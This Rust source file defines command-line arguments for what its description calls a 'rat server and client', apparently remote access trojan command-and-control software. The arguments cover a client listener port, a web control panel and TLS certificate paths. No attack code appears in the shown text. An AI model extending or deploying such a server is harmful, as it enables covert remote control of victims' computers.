/*!
 * # Command Line Arguments
 *
 * `verbose`: Output logging verbosity
 *
 * `server_addr`: Address that server listens to for incoming client connections
 *
 * `web_addr`: Address that server listens to for web control
 *
 * `client_cert_path`: Certificate used to secure connections between server and clients
 *
 * `client_pri_key_path`: Private key used to secure connections between server and clients
 */

mod misc;
pub mod network;
pub mod web;

use clap::Parser;

/// Server command line arguments
#[derive(Parser, Debug, Clone)]
#[command(
    version,
    about,
    long_about = "A high performance rat server and client written in 100% safe rust"
)]
pub struct AppArgs {
    /// Control logger verbosity
    #[arg(short, long, default_value_t = String::from("debug"))]
    pub verbose: String,

    #[arg(short, long, default_value_t = String::from("0.0.0.0:1244"))]
    pub server_addr: String,

    #[arg(short, long, default_value_t = String::from("0.0.0.0:9000"))]
    pub web_addr: String,

    #[arg(short = 'c', long, default_value_t = String::from("certs/shadow_ca.crt"))]
    pub client_cert_path: String,

    #[arg(short = 'p', long, default_value_t = String::from("certs/rsa_4096_pri.key"))]
    pub client_pri_key_path: String,
}
